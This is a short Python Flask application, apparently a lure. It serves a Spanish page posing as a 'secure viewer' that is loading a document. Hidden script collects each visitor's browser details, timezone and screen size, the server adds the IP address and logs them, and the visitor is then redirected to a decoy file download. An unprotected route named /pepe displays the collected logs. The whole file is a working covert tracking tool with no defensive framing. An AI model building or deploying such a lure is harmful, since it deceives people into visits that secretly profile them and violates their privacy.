from flask import Flask, request, send_from_directory, render_template_string
import datetime
import pytz
import json

app = Flask(__name__)

TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
  <title>Visor seguro</title>
</head>
<body>
  <h2>Conectando con visor seguro...</h2>
  <p>Por favor, espere mientras se carga el documento.</p>

  <script>
    fetch('/info', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        userAgent: navigator.userAgent,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${screen.width}x${screen.height}`,
        time: new Date().toString()
      })
    }).then(() => {
      window.location.href = '/archivo.txt';
    });
  </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(TEMPLATE)

@app.route('/info', methods=['POST'])
def receive_info():
    data = request.get_json()
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    log_entry = {
        'timestamp': datetime.datetime.now(pytz.timezone("Europe/Madrid")).strftime("%d/%m/%Y %H:%M"),
        'ip': ip,
        **data
    }

    with open("log_usuarios.json", "a") as f:
        f.write(json.dumps(log_entry) + "\n")

    return "", 204

@app.route('/archivo.txt')
def download_file():
    return send_from_directory(directory='.', path='archivo.txt', as_attachment=True)

@app.route('/pepe')
def ver_logs():
    try:
        with open("log_usuarios.json", "r") as f:
            contenido = f.readlines()
        return "<h2>Logs de usuarios</h2><pre>" + "".join(contenido) + "</pre>"
    except FileNotFoundError:
        return "Archivo log_usuarios.json no encontrado."


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
